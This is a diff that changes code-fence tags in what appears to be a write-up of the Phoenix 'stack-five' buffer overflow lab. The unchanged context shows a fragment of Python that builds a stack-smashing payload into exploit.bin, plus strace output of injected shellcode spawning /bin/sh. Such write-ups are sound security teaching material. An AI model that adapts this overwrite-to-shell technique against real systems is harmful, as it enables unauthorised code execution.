@@ -374,7 +374,7 @@ stack_smash = 'A' * (RETURN_ADDRESS - BUFFER_ADDRESS - BUFFER_SIZE) + p64(BUFFER
 with open('exploit.bin', 'wb') as f:
     f.write(buffer_smash + stack_smash + '\n' + COMMAND)
 ```
-```
+```console
 user@phoenix-amd64:~$ strace /opt/phoenix/amd64/stack-five < exploit.bin
 execve("/opt/phoenix/amd64/stack-five", ["/opt/phoenix/amd64/stack-five"], [/* 18 vars */]) = 0
 arch_prctl(ARCH_SET_FS, 0x7ffff7ffdbc8) = 0
@@ -427,12 +427,12 @@ exit_group(0)                           = ?
 ```
 
 Notice this time `gets()` calls `read()` only once,
-```
+```console
 read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 160
 execve("/bin/sh", NULL, NULL)           = 0
 ```
 as opposed to previously (before we terminated our exploit with `\n`):
-```
+```console
 read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 144
 read(0, "", 1024)                       = 0
 execve("/bin/sh", NULL, NULL)           = 0
